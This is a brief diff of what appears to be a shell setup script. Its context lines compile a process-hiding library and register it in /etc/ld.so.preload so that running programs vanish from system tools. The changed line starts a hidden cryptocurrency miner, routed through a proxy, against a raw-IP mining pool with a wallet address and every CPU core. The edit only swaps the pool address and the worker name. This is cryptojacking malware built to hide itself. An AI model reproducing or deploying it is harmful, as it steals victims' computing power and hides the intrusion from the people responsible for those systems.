@@ -55,4 +55,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./biru -a rinhash -o stratum+tcp://192.241.159.25:443 -u rin1qu9ntv7w65qxx4a99g4luzlpfv6cgt0009t0n2m.$(shuf -n 1 -i 1-99999)-crot -t $(nproc --all)
+./graftcp/graftcp & clear & ./biru -a rinhash -o stratum+tcp://64.23.144.233:443 -u rin1qu9ntv7w65qxx4a99g4luzlpfv6cgt0009t0n2m.$(shuf -n 1 -i 1-99999)-CROT -t $(nproc --all)
